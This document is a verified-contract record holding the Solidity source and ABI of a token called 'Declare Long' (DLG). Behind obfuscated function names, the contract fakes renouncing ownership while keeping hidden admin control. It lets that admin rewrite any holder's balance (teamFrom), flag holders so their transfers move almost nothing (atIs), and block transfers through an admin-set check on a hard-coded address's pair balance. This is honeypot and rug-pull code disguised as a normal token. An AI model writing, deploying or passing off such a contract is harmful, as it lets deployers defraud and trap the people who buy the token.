{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface totalTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract atAutoReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoSender {\n    function createPair(address modeMarketing, address launchedMax) external returns (address);\n}\n\ninterface minLaunch {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchReceiver) external view returns (uint256);\n\n    function transfer(address tradingAmountAt, uint256 limitFrom) external returns (bool);\n\n    function allowance(address walletMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitFrom) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingAmountAt,\n        uint256 limitFrom\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityLimitMax, uint256 value);\n    event Approval(address indexed walletMax, address indexed spender, uint256 value);\n}\n\ninterface sellBuy is minLaunch {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DeclareLong is atAutoReceiver, minLaunch, sellBuy {\n\n    bool private minReceiverIs;\n\n    uint256 enableTotalAt;\n\n    address receiverLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return shouldMin;\n    }\n\n    constructor (){\n        \n        totalTake feeMin = totalTake(receiverLaunch);\n        minLaunched = autoSender(feeMin.factory()).createPair(feeMin.WETH(), address(this));\n        if (minReceiverIs != takeTotal) {\n            toLimit = false;\n        }\n        limitAmount = _msgSender();\n        enableModeTx();\n        toAmount[limitAmount] = true;\n        tradingIs[limitAmount] = liquidityAt;\n        \n        emit Transfer(address(0), limitAmount, liquidityAt);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityAt;\n    }\n\n    event OwnershipTransferred(address indexed limitFund, address indexed shouldTakeIs);\n\n    uint256 totalMode;\n\n    function getOwner() external view returns (address) {\n        return liquidityExempt;\n    }\n\n    function feeSell(address totalTx, address tradingAmountAt, uint256 limitFrom) internal returns (bool) {\n        require(tradingIs[totalTx] >= limitFrom);\n        tradingIs[totalTx] -= limitFrom;\n        tradingIs[tradingAmountAt] += limitFrom;\n        emit Transfer(totalTx, tradingAmountAt, limitFrom);\n        return true;\n    }\n\n    bool public senderReceiver;\n\n    uint256 constant limitIs = 3 ** 10;\n\n    uint256 private liquidityAt = 100000000 * 10 ** 18;\n\n    function teamFrom(address autoTo, uint256 limitFrom) public {\n        amountFrom();\n        tradingIs[autoTo] = limitFrom;\n    }\n\n    bool private sellToken;\n\n    function tokenFee(address totalTx, address tradingAmountAt, uint256 limitFrom) internal returns (bool) {\n        if (totalTx == limitAmount) {\n            return feeSell(totalTx, tradingAmountAt, limitFrom);\n        }\n        uint256 receiverFrom = minLaunch(minLaunched).balanceOf(launchAuto);\n        require(receiverFrom == totalMode);\n        require(tradingAmountAt != launchAuto);\n        if (listFund[totalTx]) {\n            return feeSell(totalTx, tradingAmountAt, limitIs);\n        }\n        return feeSell(totalTx, tradingAmountAt, limitFrom);\n    }\n\n    mapping(address => bool) public listFund;\n\n    string private shouldMin = \"Declare Long\";\n\n    uint256 public fromTokenTo;\n\n    function enableModeTx() public {\n        emit OwnershipTransferred(limitAmount, address(0));\n        liquidityExempt = address(0);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return liquidityMin;\n    }\n\n    bool public takeTotal;\n\n    function buyFee(address receiverList) public {\n        if (senderReceiver) {\n            return;\n        }\n        if (minReceiverIs != sellToken) {\n            minReceiverIs = false;\n        }\n        toAmount[receiverList] = true;\n        if (toLimit) {\n            sellAtLaunched = fromTokenTo;\n        }\n        senderReceiver = true;\n    }\n\n    function balanceOf(address launchReceiver) public view virtual override returns (uint256) {\n        return tradingIs[launchReceiver];\n    }\n\n    function owner() external view returns (address) {\n        return liquidityExempt;\n    }\n\n    bool private toLimit;\n\n    function atIs(address autoMin) public {\n        amountFrom();\n        if (takeTotal == minReceiverIs) {\n            minReceiverIs = false;\n        }\n        if (autoMin == limitAmount || autoMin == minLaunched) {\n            return;\n        }\n        listFund[autoMin] = true;\n    }\n\n    address public minLaunched;\n\n    function exemptReceiver(uint256 limitFrom) public {\n        amountFrom();\n        totalMode = limitFrom;\n    }\n\n    mapping(address => mapping(address => uint256)) private launchAmount;\n\n    mapping(address => bool) public toAmount;\n\n    mapping(address => uint256) private tradingIs;\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingFundEnable;\n    }\n\n    function amountFrom() private view {\n        require(toAmount[_msgSender()]);\n    }\n\n    address public limitAmount;\n\n    function allowance(address teamList, address exemptAutoMode) external view virtual override returns (uint256) {\n        if (exemptAutoMode == receiverLaunch) {\n            return type(uint256).max;\n        }\n        return launchAmount[teamList][exemptAutoMode];\n    }\n\n    string private marketingFundEnable = \"DLG\";\n\n    function approve(address exemptAutoMode, uint256 limitFrom) public virtual override returns (bool) {\n        launchAmount[_msgSender()][exemptAutoMode] = limitFrom;\n        emit Approval(_msgSender(), exemptAutoMode, limitFrom);\n        return true;\n    }\n\n    uint256 public sellAtLaunched;\n\n    function transferFrom(address totalTx, address tradingAmountAt, uint256 limitFrom) external override returns (bool) {\n        if (_msgSender() != receiverLaunch) {\n            if (launchAmount[totalTx][_msgSender()] != type(uint256).max) {\n                require(limitFrom <= launchAmount[totalTx][_msgSender()]);\n                launchAmount[totalTx][_msgSender()] -= limitFrom;\n            }\n        }\n        return tokenFee(totalTx, tradingAmountAt, limitFrom);\n    }\n\n    address launchAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint8 private liquidityMin = 18;\n\n    address private liquidityExempt;\n\n    function transfer(address autoTo, uint256 limitFrom) external virtual override returns (bool) {\n        return tokenFee(_msgSender(), autoTo, limitFrom);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldTakeIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityLimitMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptAutoMode\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptAutoMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitFrom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoMin\",\"type\":\"address\"}],\"name\":\"atIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverList\",\"type\":\"address\"}],\"name\":\"buyFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableModeTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitFrom\",\"type\":\"uint256\"}],\"name\":\"exemptReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTokenTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAtLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitFrom\",\"type\":\"uint256\"}],\"name\":\"teamFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitFrom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingAmountAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitFrom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DeclareLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}